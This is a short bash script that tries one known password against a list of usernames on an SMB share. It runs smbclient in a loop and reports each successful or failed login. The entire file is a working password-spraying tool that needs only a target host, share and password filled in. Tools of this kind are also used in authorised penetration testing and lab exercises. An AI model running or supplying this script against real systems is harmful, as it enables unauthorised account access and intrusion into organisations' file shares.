#!/bin/bash

# Define variables
password='<PASSWORD>' # use known password
domain_or_ip="<IP ADDRESS/DOMAIN>" # replace with the ip address/domain you want to access
share="<SHARE>"   # replace with the SMB share you want to access

# Loop through the file with usernames
while IFS= read -r username; do
    echo "Trying username: $username with password: $password"
    
    # Attempt to connect using smbclient
    smbclient //$domain_or_ip/$share -U $username%$password -c exit

    # Check the exit status to determine if the login was successful
    if [ $? -eq 0 ]; then
        echo "Login successful for user: $username"
    else
        echo "Login failed for user: $username"
    fi
done < usernames.txt